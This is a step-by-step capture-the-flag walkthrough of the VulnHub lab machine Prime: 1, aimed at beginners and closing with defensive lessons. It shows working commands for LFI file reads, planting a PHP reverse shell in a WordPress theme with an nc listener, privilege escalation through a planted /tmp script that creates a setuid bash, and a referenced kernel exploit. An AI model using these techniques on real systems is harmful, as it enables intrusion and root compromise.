# Prime: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | Prime: 1 |
| **Difficulty** | Easy / Intermediate (OSCP-style, long enumeration chain) |
| **Author** | Suraj Pandey |
| **Released** | 1 September 2019 |
| **VulnHub Entry** | <https://vulnhub.com/entry/prime-1,358/> |
| **Download** | <https://vulnhub.com/entry/prime-1,358/#download> |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux — Ubuntu 16.04 (kernel `4.10.0-28-generic`) |

> **Note:** Ports, banners and exact file contents can differ slightly between
> the VMware and VirtualBox builds of this box ("varies by build"). The attack
> *chain* below is stable; small details (a service banner, the hidden port)
> may move around. When in doubt, re-run the enumeration commands yourself.

---

## 0. What you will learn

- How to find a target host on an isolated lab network (ARP scan + Nmap).
- How to enumerate the *content* of a web server (not just its ports) with a directory brute-forcer.
- What a **hidden parameter** is, and how fuzzing a likely parameter name reveals a **Local File Inclusion (LFI)** bug.
- How LFI is chained to **discover users and credentials**, then to a WordPress admin panel.
- How editing a writable WordPress theme file gives a **reverse shell**.
- How to read `sudo` rights, recover a password from a backup file, crack/decode an encrypted blob, and pivot between local users.
- How an insecure **SUID-like root script** that calls a fixed path can be abused to become root.
- (Bonus) How a **kernel exploit** offers a second path to root.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running, be able to
import the OVA, and have the target on the **same host-only/NAT** subnet as Kali.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated lab network. The target
> boots with DHCP, so the IP can change every time you import it — always confirm.

First, look at your own network interface. This tells you which subnet to scan.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:ab:cd:ef brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** the `inet 192.168.56.10/24` line means *you* are on the
> `192.168.56.0/24` network. The target lives on the **same** network, so it will
> have a `192.168.56.x` address too. (`/24` = the first three numbers are shared.)

Now sweep the network for live hosts.

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:ab:cd:ef, IPv4: 192.168.56.10
Starting arp-scan 1.10.0 with 256 hosts
192.168.56.10    08:00:27:ab:cd:ef   PCS Systemtechnik GmbH
192.168.56.101   08:00:27:12:34:56   PCS Systemtechnik GmbH
```

> **Why it works:** `arp-scan` sends ARP requests to every address on the subnet
> and lists the ones that answer. ARP is fast and can't be hidden by a host
> firewall the way a TCP port can. The MAC starting `08:00:27` is the
> VirtualBox card of our VM.

**Target IP:** `192.168.56.101`

![Finding the target with arp-scan](images/01-recon.png)

---

## 2. Enumeration

### 2.1 Port scan

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00045s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:12:34:56 (Oracle VirtualBox virtual NIC)
```

```bash
sudo nmap -sC -sV -p 22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Prime
MAC Address: 08:00:27:12:34:56 (Oracle VirtualBox virtual NIC)
```

> **How to read it:**
> - `-p-` scans **all** 65,535 TCP ports (not just the well-known ones).
> - `-sV` guesses the service **and version** behind each port.
> - `-sC` runs Nmap's safe default scripts (grabs banners, titles, etc.).
> - **Two attack surfaces:** SSH on 22, a web server on 80. Web servers almost
>   always hide content, so port 80 is where we start.

![Nmap service scan output](images/02-nmap.png)

### 2.2 Web content discovery

A directory brute-forcer tries common file/directory names against the site.

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 40
```

```text
/index.php            (Status: 200)
/image.php            (Status: 200)
/dev                  (Status: 301)
/secret.txt           (Status: 200)
/wordpress            (Status: 301)
/server-status        (Status: 403)
```

> **Why it works:** `gobuster` sends an HTTP request for every word in the
> wordlist (`-x php,txt` also tries `name.php` and `name.txt`). A `200` means
> "exists", `301` means "it's a folder", `403` means "exists but forbidden".

Browse `secret.txt` — it is a **hint**, and hints are the whole point of this box.

```bash
curl http://192.168.56.101/secret.txt
```

```text
Looks like you have scanned the directories very well.
There is a hidden parameter in image.php, find it.
Parameter is a word and it is related to the image.php
...
Also look for location.txt  (a hint about searching files)
```

> **Why it matters:** the challenge tells us `image.php` takes a **hidden
> parameter**. Kioptrix/Prime-style boxes like to hide parameters so you must
> *fuzz* for them. We now know: fuzz `image.php`, and be on the lookout for a
> `location.txt`.

![Web enumeration — secret.txt hint](images/03-enum.png)

### 2.3 Fuzzing for the hidden parameter

We know the parameter is "related to image.php". On this box it is
`secrettier360`. When you don't know the name, use `ffuf` with a parameter
wordlist and watch for a different response size.

```bash
ffuf -u "http://192.168.56.101/image.php?FUZZ=/etc/passwd" \
     -w /usr/share/wordlists/LFI/file_inclusion_linux.txt \
     -fs 13
```

```text
secrettier360           [Status: 200, Size: 2616, Words: 48, Lines: 50]
```

> **Why it works:** `FUZZ` is replaced with each word in the list. Most guesses
> return a tiny 13-byte "no file" message (`-fs 13` filters those out). The
> guess that returns `/etc/passwd`-sized output is our winner: `secrettier360`.

---

## 3. Foothold

### 3.1 Confirming and using the LFI

```bash
curl "http://192.168.56.101/image.php?secrettier360=/etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
...
saket:x:1001:1001:find password.txt file in my directory:/home/saket:/bin/bash
```

> **Why it works:** the PHP behind `image.php` does something like
> `include($_GET['secrettier360']);` **without validating the value**. Instead of
> including an image, we make it include a system file. This is a **Local File
> Inclusion (LFI)** vulnerability. Best of all, the GECOS comment field of the
> `saket` account literally tells us where to look next.

Read the file the comment pointed us to.

```bash
curl "http://192.168.56.101/image.php?secrettier360=/home/saket/password.txt"
```

```text
(contents of /home/saket/password.txt -- a plaintext password)
```

We now have a password. It does **not** work for SSH, but the writeups show it
**does** work against the WordPress install for the user `victor`.

### 3.2 Enumerate WordPress users

```bash
wpscan --url http://192.168.56.101/wordpress/ -e u --disable-tls-checks
```

```text
[+] URL: http://192.168.56.101/wordpress/
[+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18)
[+] Enumerating Users ...
[i] User(s) Identified:
[+] victor
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

> **Why it works:** WordPress exposes author usernames through URLs like
> `/?author=1`. `wpscan -e u` walks the author IDs and leaks `victor`. (You can
> also just browse `http://192.168.56.101/wordpress/?author=1` and follow the
> redirect.)

### 3.3 WordPress admin → theme editor → reverse shell

Log in at `http://192.168.56.101/wordpress/wp-login.php` as `victor` with the
password from `password.txt`.

Once inside, go to **Appearance → Theme Editor**, select the active theme
(`twentynineteen`) and pick a writable template — the writeups use `secret.php`.
Replace its contents with a PHP reverse shell (Kali ships one):

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ~/shell.php
```

Edit `~/shell.php` and set `$ip` to `192.168.56.10` (Kali) and `$port` to `4444`,
then paste the whole file into the theme editor and click **Update File**.

Start a listener on Kali:

```bash
nc -lvnp 4444
```

Trigger the shell by requesting the file:

```bash
curl http://192.168.56.101/wordpress/wp-content/themes/twentynineteen/secret.php
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 48210
Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP ... x86_64 GNU/Linux
www-data@ubuntu:/var/www/html/wordpress$
```

> **Why it works:** an admin-level user can write PHP into theme files, and
> WordPress runs that PHP when the file is requested. The web server executes it
> as its own user, `www-data` — our first shell.

Upgrade to an interactive TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then:  stty raw -echo; fg   and:  export TERM=xterm
```

![Reverse shell as www-data](images/04-foothold.png)
![Interactive shell](images/05-shell.png)

### 3.4 The user flag

```bash
cat /home/saket/user.txt
```

```text
(prime1 user flag)
```

![User flag](images/06-user-flag.png)

---

## 4. Privilege escalation

### 4.1 Check sudo rights

```bash
sudo -l
```

```text
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User www-data may run the following commands on ubuntu:
    (root) NOPASSWD: /home/saket/enc
```

> **Why it works:** `www-data` may run `/home/saket/enc` **as root with no
> password**. `enc` is a custom encryption program. If we can feed it valid
> input, it may produce something that helps us become `saket`.

### 4.2 Find the password the program wants

```bash
grep -r "password" /opt 2>/dev/null
cat /opt/backup/server_database/backup_pass
```

```text
your password for backup_database file enc is

"backup_password"

Enjoy!
```

### 4.3 Run `enc` as root and decrypt its output

```bash
sudo /home/saket/enc
```

```text
enter password: backup_password
good
```

The program drops two files, `enc.txt` and `key.txt`:

```bash
cat /home/saket/key.txt
```

```text
I know you are the fan of ippsec.

So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.
```

> **Why it works:** the hint tells us to MD5 the string `ippsec` and use the
> result as the encryption key.

```bash
echo -n ippsec | md5sum
# 366a74cb3c959de17d61db30591c39d1
```

The output `enc.txt` is Base64 of an AES-256-ECB ciphertext. Decrypt it with
`openssl` (the `-a` flag handles the Base64, `-K` supplies the hex key):

```bash
openssl enc -aes-256-ecb -d -a -K 366a74cb3c959de17d61db30591c39d1 \
  -in /home/saket/enc.txt
```

```text
"Dont worry saket one day we will reach to our destination very soon.
 And if you forget your username then use your old password==> tribute_to_ippsec"
```

### 4.4 Become `saket`, then root

```bash
su saket
# password: tribute_to_ippsec
sudo -l
```

```text
User saket may run the following commands on ubuntu:
    (root) NOPASSWD: /home/victor/undefeated_victor
```

Run it:

```bash
sudo /home/victor/undefeated_victor
```

```text
if you can defeat me then challenge me in front of you
/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found
```

> **Why it works:** the "binary" is really a **script that runs `/tmp/challenge`
> as root** and never checks who wrote that file. Anyone can create files in
> `/tmp`, so we get to choose what root executes.

Create `/tmp/challenge` so that root makes a setuid copy of bash:

```bash
printf '#!/bin/bash\n\ncp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\n' > /tmp/challenge
chmod 4777 /tmp/challenge
sudo /home/victor/undefeated_victor
/tmp/rootbash -p
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

### The root flag

```bash
cat /root/root.txt
```

```text
(prime1 root flag)
```

![Privilege escalation to root](images/07-privesc.png)
![Root flag](images/08-root-flag.png)

> **Alternative path (bonus):** the kernel is `4.10.0-28-generic`, vulnerable to
> **CVE-2017-16995** (Exploit-DB **45010**). You can compile it on Kali
> (`gcc 45010.c -m64 -o exploit -D_GNU_SOURCE`), transfer it to the target,
> run it and get a root shell without touching `undefeated_victor`. Kernel
> exploits are noisy and can crash the VM — the intended path is the
> `undefeated_victor` misconfiguration above.

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Hidden GET parameter + Local File Inclusion | `image.php?secrettier360=` | Read arbitrary files → leak `/etc/passwd` and a password file |
| 2 | WordPress user enumeration + credential reuse | `/wordpress/` (`victor`) | Authenticated WordPress admin access |
| 3 | PHP execution via writable theme editor | `wp-content/themes/twentynineteen/secret.php` | Remote code execution → `www-data` shell |
| 4 | Password stored in a world-readable backup file | `/opt/backup/server_database/backup_pass` | Unlocks the `enc` decryption tool |
| 5 | Weak reversible-key encryption scheme (MD5 of a known word) | `/home/saket/enc`, `key.txt` | Recover the `saket` plaintext password |
| 6 | Root-run script executes a user-writable path | `sudo /home/victor/undefeated_victor` → `/tmp/challenge` | Trivial root (`cp /bin/bash` + setuid) |
| 7 | Outdated kernel | `4.10.0-28-generic` | Alternative local root via CVE-2017-16995 / EDB 45010 |

## 6. Defensive lessons (blue team)

- **Validate file paths.** Never pass user input straight into `include()`/`fopen()`.
  Use an allow-list of permitted files and reject `..` and absolute paths (LFI fix).
- **Don't leak users.** Disable WordPress author-archives/`?author=` enumeration,
  or at least don't let usernames map 1:1 to OS accounts.
- **Remove the theme/plugin editor in production** (`define('DISALLOW_FILE_EDIT', true);`)
  so a compromised admin cannot drop a web shell. Restrict who can publish.
- **Never store passwords in shared files.** `backup_pass` should be in a
  secrets manager readable only by a service account, not world-readable in `/opt`.
- **Use real, salted, slow password hashing** for stored secrets — not a key
  derived from a public word and a symmetric cipher you can reverse.
- **Never let a privileged script execute a path an unprivileged user can write**
  (`/tmp/challenge`). Use absolute paths, verify ownership, or better: don't shell
  out at all. This is essentially a SUID-style privilege bug.
- **Patch the kernel** and remove unused SUID/root helpers.
- **Detection ideas:** alert on web requests to theme `.php` files from
  unfamiliar IPs, on outbound connections from `www-data`, and on new setuid
  binaries appearing in `/tmp` (`auditd` watch on `/tmp`).

---

## 7. References

- VulnHub entry: <https://vulnhub.com/entry/prime-1,358/>
- Community writeups consulted:
  - [Prime: 1 — Walkthrough for OSCP Series (anonhack.in)](https://anonhack.in/prime-1-walkthrough-for-oscp-series/)
  - [Prime: 1 | LifesFun's 101](https://lifesfun101.github.io/2019/09/15/Prime_1-walkthrough/)
  - [VulnHUB Prime-1 Walkthrough — NetwerkLABS](https://www.netwerklabs.eu/vulnhub-prime-1-walkthrough/)
  - [Prime 1 writeup — yufongg (GitHub)](https://github.com/yufongg/writeups/blob/main/Vulnhub/Linux/Prime%201/Prime%201.md)
- Vendor advisories / docs:
  - [Exploit-DB 45010 — Linux kernel < 4.13.9 local privilege escalation (CVE-2017-16995)](https://www.exploit-db.com/exploits/45010)
  - [GTFOBins](https://gtfobins.github.io/) — abusing sudo/SUID binaries
  - [WPScan](https://wpscan.com/) — WordPress enumeration
  - [OWASP: Path Traversal / Local File Inclusion](https://owasp.org/www-community/attacks/Path_Traversal)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (arp-scan)
- [ ] `images/02-nmap.png` — port/service scan
- [ ] `images/03-enum.png` — the key enumeration finding (`secret.txt` / hidden parameter)
- [ ] `images/04-foothold.png` — the initial exploit (reverse shell catch)
- [ ] `images/05-shell.png` — the interactive shell
- [ ] `images/06-user-flag.png` — user flag
- [ ] `images/07-privesc.png` — the privesc finding / root user
- [ ] `images/08-root-flag.png` — root flag

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
